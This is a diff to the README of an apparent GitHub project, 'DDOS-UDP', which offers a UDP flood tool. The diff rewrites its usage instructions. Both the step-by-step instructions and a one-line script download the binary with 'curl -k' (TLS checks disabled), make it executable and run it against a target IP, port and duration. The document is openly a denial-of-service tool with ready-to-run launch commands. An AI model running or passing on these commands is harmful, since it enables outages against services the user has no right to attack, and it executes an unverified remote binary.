@@ -10,17 +10,16 @@
 ### C版本使用方法：（Go版本需要自行编译）
 ```shell
 // 下载程序
-wget https://github.com/randycolin/DDOS-UDP/releases/download/v.1.0.1/GoFuck
+curl -k -L -o GoFuck https://github.com/randycolin/DDOS-UDP/releases/download/v.1.0.1/GoFuck
 // 赋予执行权限
 chmod +x GoFuck
 // 输入相应参数开始执行例如：./GoFuck 127.0.0.1 80
-./GoFuck <IP地址> <端口>
-- 按 CTRL+C 停止程序
+./GoFuck <IP地址> <端口> <时间>
 ```
 
 ### 一键脚本:
 ```shell
-wget -O GoFuck https://github.com/randycolin/DDOS-UDP/releases/download/v.1.0.1/GoFuck && chmod +x GoFuck && ./GoFuck <目标IP> <端口>
+curl -k -L -o GoFuck https://github.com/randycolin/DDOS-UDP/releases/download/v.1.0.1/GoFuck && chmod +x GoFuck && ./GoFuck 127.0.0.1 80 5
 ```
 
 ## Star History
